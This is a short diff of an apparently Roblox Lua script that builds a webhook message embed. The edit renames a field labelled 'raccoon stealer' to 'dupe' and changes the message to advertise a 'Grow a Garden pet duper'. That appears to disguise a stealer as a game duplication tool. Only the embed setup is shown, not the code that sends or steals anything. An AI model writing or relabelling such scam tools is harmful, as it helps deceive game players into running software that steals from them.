@@ -1,8 +1,8 @@
-﻿local key1 = 'duud'
+local key1 = 'duud'
 local key = key1 ;
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
-local Content = 'free raccoon lol';
+local Content = 'Grow a Garden pet duper real';
 local Embed = {
     title = 'REAL pet duper';
     color = '99999';
@@ -13,7 +13,7 @@ local Embed = {
     };
     fields = {
         {
-            name = 'raccoon stealer';
+            name = 'dupe';
             value = key;
         }
     };
